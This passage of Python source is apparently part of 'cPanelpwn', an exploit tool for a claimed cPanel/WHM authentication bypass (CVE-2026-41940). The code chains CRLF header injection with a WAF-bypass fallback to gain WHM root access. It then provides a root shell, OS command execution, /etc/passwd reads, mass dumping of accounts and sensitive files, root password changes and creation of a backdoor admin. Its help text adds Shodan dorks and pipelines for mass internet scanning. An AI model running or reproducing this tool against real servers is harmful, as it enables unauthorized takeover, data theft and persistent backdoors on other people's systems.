        log("INFO", "Using provided session/token — skipping stages 0-3")
        session_base = provided_session
        token        = provided_token
        canonical    = args.hostname or host
    else:
        canonical = args.hostname or stage0_canonical(
            scheme, host, port, timeout, waf_hdrs=waf_hdrs)
        if not canonical:
            canonical = host
        log("INFO", f"Canonical: {canonical}")

        if waf_dl: time.sleep(waf_dl)
        log("STEP", "Stage 1/4 — Minting preauth session...")
        session_base = stage1_preauth(
            scheme, host, port, canonical, timeout, waf_hdrs=waf_hdrs)
        if not session_base:
            log("ERR", "Stage 1 failed — aborting", target)
            if progress: progress.tick(False)
            return result

        if waf_dl: time.sleep(waf_dl)
        log("STEP", "Stage 2/4 — CRLF injection via Authorization header...")
        token = stage2_inject(
            scheme, host, port, canonical, session_base, timeout, waf_hdrs=waf_hdrs)

        # WAF blocked stage2 → engage bypass agent
        if not token and waf:
            token = waf_bypass_agent(waf, scheme, host, port,
                                     canonical, session_base, timeout)

        if not token:
            log("ERR", "Stage 2 failed — target may be patched or WAF unbypassable",
                target)
            if progress: progress.tick(False)
            return result

        if waf_dl: time.sleep(waf_dl)
        log("STEP", "Stage 3/4 — Firing do_token_denied gadget (raw→cache)...")
        stage3_propagate(
            scheme, host, port, canonical, session_base, timeout, waf_hdrs=waf_hdrs)

    if waf_dl: time.sleep(waf_dl)
    log("STEP", "Stage 4/4 — Verifying WHM root access...")
    verify = stage4_verify(scheme, host, port, canonical,
                           session_base, token, timeout, waf_hdrs=waf_hdrs)

    if not verify.get("confirmed"):
        log("ERR", "Stage 4 failed — auth bypass did not land", target)
        if progress: progress.tick(False)
        return result

    version = verify.get("version", "unknown")
    patched = is_version_patched(version)
    pnote   = ""
    if patched is True:
        pnote = f" {C.YELLOW}(v{version} — may be patched, verify manually){C.RESET}"
    elif patched is False:
        pnote = f" {C.RED}(v{version} — CONFIRMED vulnerable){C.RESET}"

    log("PWNED", f"CVE-2026-41940 CONFIRMED — WHM root access! {pnote}", target)
    log("PWNED", f"  Token    : {token}")
    log("PWNED", f"  Session  : {session_base[:40]}...")
    log("PWNED", f"  Version  : {version}")
    log("PWNED", f"  API URL  : {build_url(scheme, host, port, token+'/json-api/version')}")

    finding = {
        "severity":  "CRIT",
        "title":     "CVE-2026-41940 — cPanel & WHM Authentication Bypass",
        "target":    target,
        "canonical": canonical,
        "session":   session_base,
        "token":     token,
        "version":   version,
        "api_url":   build_url(scheme, host, port, f"{token}/json-api/version"),
        "evidence":  verify.get("body", "")[:400],
        "cve":       "CVE-2026-41940",
        "cvss":      "10.0",
        "waf":       result.get("waf", ""),
        "timestamp": datetime.now().isoformat(),
    }
    STORE.add(finding)

    ctx = ScanCtx(scheme, host, port, canonical, session_base, token, timeout,
                  waf=waf or "", bypass_hdrs=waf_hdrs)
    with CTX_MAP_LOCK:
        CTX_MAP[target] = ctx

    result["vuln"]    = True
    result["finding"] = finding
    result["ctx"]     = ctx

    if progress:
        progress.tick(True)
    else:
        if args.action:
            run_action(ctx, args)

    return result

# ══════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════
def print_summary(elapsed: float, total: int):
    findings = STORE.all()
    W = 70
    print(f"\n{C.BOLD}{'═'*W}{C.RESET}", file=sys.stderr)
    print(f"{C.BOLD}  cPanelpwn — CVE-2026-41940 Scan Complete{C.RESET}",
          file=sys.stderr)
    print(f"  {C.DIM}Time: {elapsed:.1f}s  ·  Targets: {total}{C.RESET}",
          file=sys.stderr)
    print(f"{'─'*W}", file=sys.stderr)
    if not findings:
        print(f"  {C.DIM}No vulnerable targets found.{C.RESET}", file=sys.stderr)
    else:
        print(f"\n  {C.RED}{C.BOLD}⚡ {len(findings)} VULNERABLE TARGET(S){C.RESET}\n",
              file=sys.stderr)
        for f in findings:
            print(f"  {C.RED}{C.BOLD}Target   :{C.RESET} {f['target']}",
                  file=sys.stderr)
            print(f"  {C.CYAN}Version  :{C.RESET} {f['version']}",
                  file=sys.stderr)
            print(f"  {C.CYAN}Token    :{C.RESET} {f['token']}",
                  file=sys.stderr)
            print(f"  {C.GREEN}API URL  :{C.RESET} {f['api_url']}",
                  file=sys.stderr)
            print(f"  {C.DIM}Session  : {f['session'][:45]}...{C.RESET}",
                  file=sys.stderr)
            ev = f.get("evidence", "")[:200].replace("\n", " ")
            print(f"  {C.GREEN}Evidence : {ev}{C.RESET}\n", file=sys.stderr)
    print(f"{'═'*W}{C.RESET}\n", file=sys.stderr)

# ══════════════════════════════════════════════════════════════
#  HTML REPORT
# ══════════════════════════════════════════════════════════════
def _html_css() -> str:
    return (
        "* { box-sizing: border-box; margin: 0; padding: 0; }"
        "body { background: #0d1117; color: #e6edf3; "
        "font-family: 'Segoe UI', Consolas, monospace; padding: 2rem; }"
        "h1 { color: #ff4444; font-size: 1.8rem; margin-bottom: 0.4rem; }"
        ".subtitle { color: #8b949e; margin-bottom: 2rem; font-size: 0.85rem; }"
        ".stats { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }"
        ".stat-box { background: #161b22; border: 1px solid #30363d; "
        "border-radius: 8px; padding: 1rem 1.5rem; min-width: 120px; }"
        ".stat-box .num { font-size: 2rem; font-weight: bold; color: #ff4444; }"
        ".stat-box .label { color: #8b949e; font-size: 0.78rem; text-transform: uppercase; }"
        ".finding { background: #161b22; border: 1px solid #ff4444; "
        "border-radius: 8px; margin-bottom: 1.5rem; overflow: hidden; }"
        ".finding-header { background: #1f0d0d; padding: 1rem 1.5rem; "
        "border-bottom: 1px solid #30363d; }"
        ".finding-title { color: #ff4444; font-weight: bold; font-size: 1rem; }"
        ".finding-target { color: #58a6ff; font-family: monospace; "
        "font-size: 0.85rem; margin-top: 0.3rem; word-break: break-all; }"
        ".finding-body { padding: 1.5rem; display: grid; "
        "grid-template-columns: 1fr 1fr; gap: 1rem; }"
        ".field label { color: #8b949e; font-size: 0.72rem; "
        "text-transform: uppercase; display: block; margin-bottom: 2px; }"
        ".field value { color: #e6edf3; font-family: monospace; "
        "font-size: 0.82rem; word-break: break-all; }"
        ".evidence { grid-column: 1 / -1; }"
        ".evidence pre { background: #0d1117; padding: 0.8rem; border-radius: 4px; "
        "font-size: 0.78rem; color: #7ee787; overflow-x: auto; "
        "white-space: pre-wrap; margin-top: 4px; }"
        ".badge { display: inline-block; padding: 0.15rem 0.5rem; "
        "border-radius: 4px; font-size: 0.7rem; font-weight: bold; margin-right: 4px; }"
        ".badge-crit { background: #ff4444; color: #fff; }"
        ".badge-cvss { background: #e06c00; color: #fff; }"
        ".badge-waf  { background: #1f6feb; color: #fff; }"
        "footer { margin-top: 3rem; color: #3d444d; font-size: 0.75rem; text-align: center; }"
        "a { color: #58a6ff; }"
    )

def save_html_report(findings: list, out_file: str, elapsed: float, total: int):
    e = _html_mod.escape

    def card(f) -> str:
        waf_badge = (f'<span class="badge badge-waf">WAF: {e(f.get("waf",""))}</span>'
                     if f.get("waf") else "")
        return (
            '<div class="finding">'
            '<div class="finding-header">'
            f'<div class="finding-title">'
            f'<span class="badge badge-crit">CRITICAL</span>'
            f'<span class="badge badge-cvss">CVSS {e(str(f.get("cvss","10.0")))}</span>'
            f'{waf_badge} {e(f.get("title",""))}</div>'
            f'<div class="finding-target">{e(f.get("target",""))}</div>'
            '</div>'
            '<div class="finding-body">'
            f'<div class="field"><label>Version</label><value>{e(str(f.get("version","")))}</value></div>'
            f'<div class="field"><label>Token</label><value>{e(str(f.get("token","")))}</value></div>'
            f'<div class="field"><label>Canonical</label><value>{e(str(f.get("canonical","")))}</value></div>'
            f'<div class="field"><label>Timestamp</label><value>{e(str(f.get("timestamp","")))}</value></div>'
            f'<div class="field"><label>API URL</label>'
            f'<value><a href="{e(str(f.get("api_url","")))}">{e(str(f.get("api_url","")))}</a></value></div>'
            f'<div class="field"><label>Session</label>'
            f'<value>{e(str(f.get("session",""))[:70])}...</value></div>'
            f'<div class="field evidence"><label>Evidence</label>'
            f'<pre>{e(str(f.get("evidence",""))[:500])}</pre></div>'
            '</div></div>'
        )

    ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cards  = "".join(card(f) for f in findings)
    if not cards:
        cards = "<p style='color:#8b949e;padding:1rem'>No vulnerable targets found.</p>"

    page = (
        "<!DOCTYPE html>\n<html lang='en'>\n<head>\n"
        "<meta charset='UTF-8'>\n"
        "<meta name='viewport' content='width=device-width, initial-scale=1'>\n"
        "<title>cPanelpwn — CVE-2026-41940 Report</title>\n"
        f"<style>{_html_css()}</style>\n"
        "</head>\n<body>\n"
        "<h1>cPanelpwn — CVE-2026-41940</h1>\n"
        f"<div class='subtitle'>cPanel &amp; WHM Auth Bypass Report &nbsp;|&nbsp; {ts_str}</div>\n"
        "<div class='stats'>\n"
        f"  <div class='stat-box'><div class='num'>{total}</div>"
        f"<div class='label'>Scanned</div></div>\n"
        f"  <div class='stat-box'><div class='num'>{len(findings)}</div>"
        f"<div class='label'>Vulnerable</div></div>\n"
        f"  <div class='stat-box'><div class='num'>{elapsed:.1f}s</div>"
        f"<div class='label'>Duration</div></div>\n"
        "</div>\n"
        + cards +
        "\n<footer>cPanelpwn v2.0 &nbsp;|&nbsp; CVE-2026-41940 &nbsp;|&nbsp; "
        "CVSS 10.0 &nbsp;|&nbsp; For authorized penetration testing only</footer>\n"
        "</body>\n</html>"
    )

    with open(out_file, "w", encoding="utf-8") as fp:
        fp.write(page)
    log("OK", f"HTML report → {out_file}")

# ══════════════════════════════════════════════════════════════
#  OUTPUT
# ══════════════════════════════════════════════════════════════
def save_output(findings, out_file: str, elapsed: float = 0.0, total: int = 0):
    os.makedirs(os.path.dirname(out_file) if os.path.dirname(out_file) else ".",
                exist_ok=True)
    ext = os.path.splitext(out_file)[1].lower()

    if ext == ".html":
        save_html_report(findings, out_file, elapsed, total)
    elif ext == ".csv":
        fields = ["target", "version", "token", "canonical", "session",
                  "api_url", "cve", "cvss", "waf", "timestamp"]
        with open(out_file, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=fields, extrasaction="ignore")
            w.writeheader()
            w.writerows(findings)
        log("OK", f"Results → {out_file}")
    else:
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump({
                "scanner":   "cPanelpwn v2.0",
                "cve":       "CVE-2026-41940",
                "timestamp": datetime.now().isoformat(),
                "findings":  findings,
            }, f, indent=2, ensure_ascii=False)
        log("OK", f"Results → {out_file}")

# ══════════════════════════════════════════════════════════════
#  INTERACTIVE WHM SHELL
# ══════════════════════════════════════════════════════════════
def whm_shell(ctx: ScanCtx):
    """Interactive WHM shell — root@target ▶ prompt."""
    target_display = ctx.canonical or f"{ctx.host}:{ctx.port}"
    print(f"\n{C.RED}{C.BOLD}{'═'*60}{C.RESET}")
    print(f"{C.RED}{C.BOLD}  WHM Shell — {target_display}{C.RESET}")
    print(f"  {C.DIM}CVE-2026-41940 | Auth: CRLF bypass | Type 'help'{C.RESET}")
    print(f"{C.RED}{C.BOLD}{'═'*60}{C.RESET}\n")

    prompt = (f"{C.RED}root{C.RESET}@{C.CYAN}{target_display}{C.RESET} "
              f"{C.BOLD}▶{C.RESET} ")

    while True:
        try:
            try:
                line = input(prompt).strip()
            except EOFError:
                break
            if not line:
                continue
            parts = line.split(None, 1)
            cmd   = parts[0].lower()
            arg   = parts[1] if len(parts) > 1 else ""

            if cmd in ("exit", "quit", "q"):
                print(f"{C.DIM}Exiting shell.{C.RESET}")
                break

            elif cmd == "help":
                print(f"""
  {C.CYAN}Server Info:{C.RESET}
    id / whoami       uid=0 + hostname
    hostname          hostname only
    version           cPanel version
    info              detailed server info (parallel fetch)

  {C.CYAN}File Operations:{C.RESET}
    cat <path>        Read file content
    ls [path]         List directory

  {C.CYAN}Account Management:{C.RESET}
    accounts          List all cPanel accounts
    addadmin <u> <p>  Create backdoor reseller admin
    passwd <pass>     Change root password
    dump              Mass dump accounts + sensitive files

  {C.CYAN}API (raw):{C.RESET}
    api <endpoint> [key=value ...]
    Example: api listaccts search=user

  {C.CYAN}Exec:{C.RESET}
    exec <command>    Try OS command execution
    <anything else>   Attempt as shell command

  {C.CYAN}Shell:{C.RESET}
    help / exit / quit
""")

            elif cmd in ("id", "whoami"):
                s, data = whm_api(ctx, "gethostname", {})
                print("  uid=0(root) gid=0(root) groups=0(root)")
                if s == 200 and isinstance(data, dict):
                    hn = data.get("data", "") or str(data)
                    print(f"  hostname: {hn}")

            elif cmd == "hostname":
                s, data = whm_api(ctx, "gethostname", {})
                if s == 200:
                    print(f"  {data.get('data', data)}")

            elif cmd == "version":
                s, data = whm_api(ctx, "version", {})
                print(f"  {json.dumps(data.get('data', data), indent=2)[:400]}")

            elif cmd == "info":
                action_server_info(ctx)

            elif cmd == "accounts":
                action_list_accounts(ctx)

            elif cmd == "dump":
                action_dump(ctx)

            elif cmd == "cat":
                if not arg:
                    print("  Usage: cat <path>"); continue
                content = action_read_file_direct(ctx, arg)
                if content:
                    print(f"{C.GREEN}{content[:2000]}{C.RESET}")
                else:
                    print(f"  {C.DIM}Cannot read {arg} — "
                          f"license may block file access{C.RESET}")

            elif cmd == "ls":
                path = arg or "/"
                s, data = whm_api(ctx, "cpanel",
                    {"cpanel_jsonapi_module": "Fileman",
                     "cpanel_jsonapi_func":   "listfiles",
                     "dir": path})
                if s == 200 and isinstance(data, dict):
                    files = data.get("cpanelresult", {}).get("data", []) or []
                    for f in files[:40]:
                        ftype = "d" if f.get("type", "f") == "dir" else "-"
                        print(f"  {ftype}  {f.get('file', '?')}")
                else:
                    content = action_read_file_direct(ctx, "/etc/passwd")
                    if content:
                        print(f"  {C.DIM}(ls unavailable — /etc/passwd preview):{C.RESET}")
                        for ln in content.split("\n")[:5]:
                            print(f"  {ln}")

            elif cmd == "exec":
                if not arg:
                    print("  Usage: exec <command>"); continue
                action_exec_cmd(ctx, arg)

            elif cmd == "addadmin":
                parts2 = arg.split(None, 1)
                if len(parts2) < 2:
                    print("  Usage: addadmin <username> <password>"); continue
                action_add_admin(ctx, parts2[0], parts2[1])

            elif cmd == "passwd":
                if not arg:
                    print("  Usage: passwd <newpassword>"); continue
                action_change_passwd(ctx, arg)

            elif cmd == "api":
                api_parts = arg.split(None, 1) if arg else []
                if not api_parts:
                    print("  Usage: api <endpoint> [key=value ...]"); continue
                ep     = api_parts[0]
                params = {}
                if len(api_parts) > 1:
                    for kv in api_parts[1].split():
                        if "=" in kv:
                            k, v = kv.split("=", 1)
                            params[k] = v
                s, data = whm_api(ctx, ep, params)
                print(f"  HTTP {s}")
                print(f"  {json.dumps(data, indent=2, default=str)[:1000]}")

            else:
                action_exec_cmd(ctx, line)

        except KeyboardInterrupt:
            print(f"\n  {C.DIM}Ctrl+C — type 'exit' to quit{C.RESET}")
        except Exception as e:
            print(f"  {C.DIM}Error: {e}{C.RESET}")

# ══════════════════════════════════════════════════════════════
#  EARLY ARG VALIDATION
# ══════════════════════════════════════════════════════════════
def validate_args(args, p):
    """Fail fast before scanning if required companion args are missing."""
    errs = []
    a = args.action

    if getattr(args, "check", False) and a:
        errs.append("--check and --action are mutually exclusive")

    if getattr(args, "session", None) and not getattr(args, "token_reuse", None):
        errs.append("--session requires --token")
    if getattr(args, "token_reuse", None) and not getattr(args, "session", None):
        errs.append("--token requires --session")
    if (getattr(args, "session", None)
            and len(getattr(args, "target_list", [])) > 1):
        errs.append("--session/--token only work with a single target (-u)")

    if a == "passwd" and not args.passwd:
        errs.append("--action passwd requires --passwd <password>")
    if a == "adduser" and not (getattr(args, "new_user", None)
                               and getattr(args, "new_domain", None)):
        errs.append("--action adduser requires --new-user and --new-domain")
    if a == "addadmin" and not (getattr(args, "new_user", None) and args.passwd):
        errs.append("--action addadmin requires --new-user and --passwd")
    if a == "readfile" and not args.read_file:
        errs.append("--action readfile requires --read-file <path>")
    if a == "shell" and len(getattr(args, "target_list", [])) > 1:
        errs.append("--action shell only works with a single target (-u)")
    if getattr(args, "post_all", False) and not a:
        errs.append("--post-all requires --action")

    for e in errs:
        p.error(e)

# ══════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════
ANSI_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")

def extract_url(line: str) -> Optional[str]:
    clean = ANSI_RE.sub("", line).strip()
    m = re.search(r"(https?://[a-zA-Z0-9._:/?&=%-]+)", clean)
    if m: return m.group(1).rstrip("[].,")
    m2 = re.match(r"^(\d{1,3}(?:\.\d{1,3}){3})\s+(\d+)$", clean)
    if m2: return f"https://{m2.group(1)}:{m2.group(2)}"
    return None

def main():
    global _RETRIES, _QUIET, _PROXY, _TIMEOUT_PROBE
    banner()
    p = argparse.ArgumentParser(
        description="cPanelpwn — CVE-2026-41940 cPanel/WHM Auth Bypass",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Shodan dorks:
  title:"WHM Login"
  title:"WebHost Manager" port:2087
  product:"cPanel" port:2087

Examples:
  python3 cPanelpwn.py -u https://target.com:2087
  python3 cPanelpwn.py -u https://target.com:2087 --check
  python3 cPanelpwn.py -u https://target.com:2087 --session <ck> --token /cpsess1234567890 --action list
  python3 cPanelpwn.py --domain target.com -t 20 -q -o results.html
  python3 cPanelpwn.py --domain target.com --max-targets 50 --action list --post-all
  python3 cPanelpwn.py -u https://target.com:2087 --action list
  python3 cPanelpwn.py -u https://target.com:2087 --action dump
  python3 cPanelpwn.py -u https://target.com:2087 --action passwd --passwd P@ss2026!
  python3 cPanelpwn.py -u https://target.com:2087 --action cmd --cmd "id;whoami"
  python3 cPanelpwn.py -u https://target.com:2087 --action readfile --read-file /etc/passwd
  python3 cPanelpwn.py -u https://target.com:2087 --action addadmin --new-user hax --passwd S3cr3t!
  python3 cPanelpwn.py -u https://target.com:2087 --proxy http://127.0.0.1:8080
  python3 cPanelpwn.py -l targets.txt -t 20 -o results.json -q
  python3 cPanelpwn.py -l nmap.xml -t 20 -o results.html
  python3 cPanelpwn.py -l masscan.json --exclude skip.txt -o results.csv
  python3 cPanelpwn.py -l targets.txt --action list --post-all
  cat urls.txt | python3 cPanelpwn.py -q
  subfinder -d target.com | httpx -p 2087 -silent | python3 cPanelpwn.py
  shodan search --fields ip_str,port 'title:"WHM Login"' | \\
    awk '{print "https://"$1":"$2}' | python3 cPanelpwn.py -t 30 -q
        """
    )

    tg = p.add_argument_group("Target")
    tg.add_argument("-u", "--url",
                    help="Single target URL (e.g. https://host:2087)")
    tg.add_argument("-l", "--list",
                    help="File with targets — auto-detects nmap XML, "
                         "masscan JSON, Shodan NDJSON, or plain text")
    tg.add_argument("--domain",
                    help="Root domain for subdomain discovery (e.g. target.com)\n"
                         "Sources: crt.sh CT logs + DNS brute-force → WHM port probe")
    tg.add_argument("--hostname",
                    help="Override canonical Host header (auto-discovered)")
    tg.add_argument("--session",
                    help="Reuse existing whostmgrsession cookie (skip stages 0-3)")
    tg.add_argument("--token",  dest="token_reuse",
                    help="Reuse existing /cpsessXXXXXXXXXX token (requires --session)")
    tg.add_argument("--exclude",
                    help="File of hosts/URLs to skip (one per line)")
    tg.add_argument("--max-targets",  type=int, default=0,
                    help="Safety cap on targets after --domain discovery (0 = unlimited)")

    sg = p.add_argument_group("Scan")
    sg.add_argument("-t", "--threads",      type=int, default=10,
                    help="Concurrent threads for scanning (default: 10)")
    sg.add_argument("--timeout",            type=int, default=15,
                    help="Per-request timeout for exploit chain in seconds (default: 15)")
    sg.add_argument("--timeout-probe",      type=int, default=5,
                    help="Timeout for discovery/WAF probe phase in seconds (default: 5)")
    sg.add_argument("--retries",            type=int, default=2,
                    help="Network retries per request on transient error (default: 2)")
    sg.add_argument("--rate-limit",         type=float, default=0,
                    help="Seconds between target submissions (default: 0)")
    sg.add_argument("--proxy",
                    help="HTTP proxy for all requests (e.g. http://127.0.0.1:8080)")
    sg.add_argument("--check",              action="store_true",
                    help="Passive version check only — no exploit attempt")

    ag = p.add_argument_group("Post-Exploit")
    ag.add_argument("--action",
                    choices=["list", "passwd", "cmd", "exec", "info",
                             "version", "shell", "adduser", "addadmin",
                             "readfile", "dump"],
                    help="Post-exploit action to run after a successful bypass")
    ag.add_argument("--post-all",        action="store_true",
                    help="Run --action on ALL vulnerable targets after batch scan")
    ag.add_argument("--passwd",          help="Password (--action passwd / addadmin)")
    ag.add_argument("--cmd",             help="OS command to execute (--action cmd/exec)")
    ag.add_argument("--new-user",        help="Username (--action adduser / addadmin)")
    ag.add_argument("--new-domain",      help="Domain (--action adduser)")
    ag.add_argument("--read-file",       help="File path to read (--action readfile)")

    og = p.add_argument_group("Output")
    og.add_argument("-o", "--output",
                    help="Save results to file (.json, .csv, or .html)")
    og.add_argument("-q", "--quiet",     action="store_true",
                    help="Suppress all logs except PWNED/CRIT/HIGH")
    og.add_argument("--no-color",        action="store_true",
                    help="Disable ANSI colors")

    args = p.parse_args()

    if args.no_color:
        for attr in [x for x in dir(C) if not x.startswith("_")]:
            setattr(C, attr, "")

    _RETRIES       = args.retries
    _QUIET         = args.quiet
    _PROXY         = args.proxy
    _TIMEOUT_PROBE = args.timeout_probe

    # ── Build target list ────────────────────────────────────────
    targets: List[str] = []

    if args.url:
        targets.append(args.url)

    if args.list:
        loaded = load_list_file(args.list)
        if not loaded and not os.path.exists(args.list):
            p.error(f"File not found: {args.list}")
        targets += loaded

    if not sys.stdin.isatty():
        for line in sys.stdin:
            u = extract_url(line)
            if u: targets.append(u)

    # --domain: discover subdomains, probe WHM, inject into target list
    if args.domain:
        disc = discover_subdomains(
            domain        = args.domain.lower().strip(),
            threads       = args.threads,
            timeout       = args.timeout,
            timeout_probe = _TIMEOUT_PROBE,
        )
        # Apply --max-targets cap to discovered targets only
        if args.max_targets and len(disc) > args.max_targets:
            log("WARN",
                f"--max-targets {args.max_targets}: capping {len(disc)} "
                f"discovered targets")
            disc = disc[:args.max_targets]
        targets += disc

    if not targets:
        p.print_help(); sys.exit(1)

    targets = list(dict.fromkeys(targets))   # deduplicate, preserve order

    # --exclude filtering
    if args.exclude:
        excluded = load_exclude(args.exclude)
        before   = len(targets)
        targets  = [t for t in targets if not is_excluded(t, excluded)]
        removed  = before - len(targets)
        if removed:
            log("INFO", f"Excluded {removed} target(s) from --exclude list")

    args.target_list = targets
    validate_args(args, p)

    # ── Check mode (passive, no exploit) ────────────────────────
    if args.check:
        log("INFO", f"CHECK mode — passive version scan on {len(targets)} target(s)")
        t0           = time.time()
        check_results = []
        if len(targets) == 1:
            check_results.append(check_target(targets[0]))
        else:
            with ThreadPoolExecutor(max_workers=args.threads) as ex:
                futs = {ex.submit(check_target, t): t for t in targets}
                for fut in as_completed(futs):
                    try:
                        check_results.append(fut.result())
                    except Exception as exc:
                        log("ERR", f"check_target error: {exc}")
        if args.output:
            os.makedirs(
                os.path.dirname(args.output) if os.path.dirname(args.output) else ".",
                exist_ok=True)
            with open(args.output, "w", encoding="utf-8") as fp:
                json.dump(check_results, fp, indent=2, ensure_ascii=False)
            log("OK", f"Check results → {args.output}")
        log("INFO",
            f"Check complete: {len(check_results)} target(s) in "
            f"{time.time()-t0:.1f}s")
        sys.exit(0)

    # ── Normal scan ──────────────────────────────────────────────
    log("INFO",
        f"Targets: {len(targets)}  Threads: {args.threads}  "
        f"Timeout: {args.timeout}s  Probe: {_TIMEOUT_PROBE}s  "
        f"Retries: {args.retries}"
        + (f"  Proxy: {_PROXY}" if _PROXY else "")
        + (f"  Action: {args.action}" if args.action else ""))

    t0 = time.time()
    signal.signal(signal.SIGINT,
                  lambda s, f: (print_summary(time.time() - t0, len(targets)),
                                sys.exit(0)))

    if len(targets) == 1:
        scan(targets[0], args)
    else:
        progress = Progress(len(targets))
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = []
            for t in targets:
                futs.append(ex.submit(scan, t, args, progress))
                if args.rate_limit:
                    time.sleep(args.rate_limit)
            for _ in as_completed(futs):
                pass

        if args.post_all and args.action and CTX_MAP:
            log("API", f"--post-all: running '{args.action}' "
                f"on {len(CTX_MAP)} vulnerable target(s)...")
            for tgt, ctx in CTX_MAP.items():
                run_action(ctx, args)

    elapsed = time.time() - t0
    print_summary(elapsed, len(targets))
    if args.output:
        save_output(STORE.all(), args.output, elapsed=elapsed, total=len(targets))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Interrupted.{C.RESET}", file=sys.stderr)
        sys.exit(0)
